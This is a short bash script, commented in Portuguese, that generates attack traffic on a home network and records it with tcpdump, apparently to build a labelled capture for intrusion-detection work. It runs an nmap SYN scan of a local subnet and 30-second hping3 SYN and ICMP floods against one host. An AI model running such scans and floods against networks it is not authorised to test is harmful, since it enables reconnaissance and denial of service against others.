#!/usr/bin/env bash
# Script para simular tráfego de ataque na sua rede doméstica
INTERFACE="enp3s0"                     # sua interface
PCAP_OUT="data/raw/attack.pcap"        # arquivo de saída
CAP_DURATION=120                       # duração da captura em segundos

# Inicia captura em background
sudo timeout $CAP_DURATION tcpdump -i $INTERFACE -w $PCAP_OUT &
CAP_PID=$!
echo "Capturando em $PCAP_OUT por $CAP_DURATION segundos (PID $CAP_PID)..."
sleep 2  # dá um tempinho para iniciar a captura

# 1) Scan SYN com Nmap
echo "Iniciando SYN scan com nmap..."
nmap -sS -Pn 192.168.15.0/24

# 2) Flood SYN com hping3 (alvo: .10)
TARGET_IP="192.168.15.10"
echo "Iniciando SYN flood com hping3 em $TARGET_IP..."
sudo timeout 30 hping3 --flood -S $TARGET_IP -p 80

# 3) ICMP flood com hping3
echo "Iniciando ICMP flood com hping3 em $TARGET_IP..."
sudo timeout 30 hping3 --flood -1 $TARGET_IP

# Aguarda o fim da captura
wait $CAP_PID
echo "Captura de ataque concluída: $PCAP_OUT"
